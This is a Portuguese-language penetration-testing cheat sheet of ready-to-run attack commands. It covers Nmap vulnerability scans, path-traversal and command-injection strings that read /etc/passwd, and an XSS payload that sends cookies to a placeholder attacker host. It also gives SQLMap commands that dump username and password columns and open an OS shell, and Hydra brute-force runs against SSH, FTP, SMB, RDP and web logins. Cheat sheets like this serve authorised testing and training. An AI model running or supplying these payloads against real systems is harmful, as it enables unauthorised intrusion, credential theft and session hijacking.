# ⚡ Fichas Rápidas de Ferramentas (SQLMap, Hydra, Searchsploit, Injeção)

---

## 1. Nmap One-Liners

```bash
# Escaneamento ultra-rápido com extração de portas para cópia
nmap -vv -sV -sC -O -p- -A --script vuln -Pn --open -oA saida IP_ALVO
cat saida.nmap | grep tcp | cut -d "/" -f 1 | grep -v ports | sort -un | tr '\n' ',' > all_ports.txt
```

---

## 2. Testes Rápidos de Injeção Web

```text
# LFI (Local File Inclusion)
/../../../../../../../../../../etc/passwd
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

# Command Injection
;cat /etc/passwd;#
| id
`whoami`

# XSS (Cross-Site Scripting)
<script>alert('Pentester')</script>
<script>document.location="http://SEU_IP/?"+document.cookie</script>
```

---

## 3. SQLMap (Injeção de SQL Automatizada)

```bash
# Enumerar Bancos de Dados
sqlmap -u "http://IP_ALVO/pagina.php?id=1" --dbs

# Enumerar Tabelas de um DB
sqlmap -u "http://IP_ALVO/pagina.php?id=1" -D nome_db --tables

# Dump de Dados de Colunas
sqlmap -u "http://IP_ALVO/pagina.php?id=1" -D nome_db -T usuarios -C usuario,senha --dump

# Shell Interativa no Sistema Operacional (--os-shell)
sqlmap -u "http://IP_ALVO/pagina.php?id=1" --os-shell

# Requisição Autenticada via POST com Cookie
sqlmap -u "http://IP_ALVO/pagina.php" --data="user=admin&pass=teste" --cookie="PHPSESSID=123"
```

---

## 4. Hydra (Brute Force de Credenciais)

```bash
# SSH Brute Force
hydra -l usuario -P /usr/share/wordlists/rockyou.txt IP_ALVO ssh

# FTP Brute Force
hydra -L users.txt -P pass.txt IP_ALVO ftp

# SMB Brute Force
hydra -L users.txt -P pass.txt IP_ALVO smb

# HTTP POST Login Form
hydra -L users.txt -P pass.txt IP_ALVO http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# RDP Brute Force
hydra -L users.txt -P pass.txt IP_ALVO rdp
```

---

## 5. Searchsploit (Exploits Locais do Exploit-DB)

```bash
# Atualizar banco de dados local
searchsploit -u

# Buscar por nome/versão do serviço
searchsploit apache 2.4.49

# Copiar exploit para o diretório atual (-m)
searchsploit -m exploits/linux/http/50383.py

# Inspecionar arquivo XML do Nmap
searchsploit --nmap scan.xml
```